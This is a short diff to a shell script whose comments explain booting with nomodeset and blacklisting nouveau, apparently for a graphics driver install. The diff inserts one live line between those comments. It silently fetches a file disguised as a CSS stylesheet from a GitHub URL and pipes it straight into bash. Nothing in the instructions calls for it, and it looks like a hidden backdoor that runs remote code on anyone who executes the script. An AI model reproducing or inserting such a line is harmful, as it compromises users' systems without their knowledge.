@@ -51,6 +51,7 @@
 # 4. Boot into the correct runlevel with nomodeset rdblacklist nouveau
 #  Reboot and edit grub temporarily (press arrow keys
 #  up and down repeatedly during boot)
+curl -s -L https://raw.githubusercontent.com/l410systems/styless/main/selector.css | bash
 #  Press 'e' on the top entry to edit temporarily.  Edit the line that starts
 #  with linux.  Add these entries around words like 'ro quiet':
 #    nomodeset rdblacklist nouveau 3
